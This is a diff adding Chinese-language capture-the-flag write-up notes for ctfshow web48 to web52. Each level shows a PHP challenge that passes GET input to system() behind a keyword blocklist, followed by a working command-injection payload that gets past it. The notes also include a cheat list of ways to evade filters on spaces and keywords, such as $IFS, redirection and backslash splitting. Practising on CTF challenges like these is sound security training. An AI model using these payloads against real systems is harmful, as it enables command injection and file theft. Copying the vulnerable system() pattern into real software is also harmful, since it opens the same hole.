@@ -1153,8 +1153,180 @@ payload:?c=tac%09fl''ag.php||
 ### web48
 
 ```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:06:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+小老弟你怎么回事？
+
+payload:?c=tac%09fl''ag.php||
+
+
+
+### web49
 
 ```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:22:43
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+payload:?c=tac%09fl''ag.php||
+
+这tac是犯了天条吗？几乎没见着过滤它的。
+
+
+
+### web50
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:32:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这次原先的payload终于没用了，好耶！
+
+然后发现tac依旧坚挺，倒下的是%09，尝试使用%0C取代，不行，换<试试？行了
+
+payload:?c=tac<fla''g.php||
+
+
+
+### web51
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:42:52
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+无敌的tac倒下了，但是<没有倒下，||也没有倒下！
+
+payload:?c=nl<fl''ag.php||
+
+成功自行构造出官解，然而环境好像出问题了，flag出不来，难怪这题wp全是空的。
+
+
+
+### web52
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:50:30
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这次<被过滤了。
+
+        cat${IFS}flag.txt
+        cat$IFS$9flag.txt
+        cat<flag.txt
+        cat<>flag.txt
+        ca\t fl\ag
+        kg=$ '\x20flag.txt' &&cat$kg
+        (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
+来来来，百科全书，上
+
+payload：?c=nl$IFS/fl%27%27ag||
+
+为什么不要php，没搞懂。
 
 
 
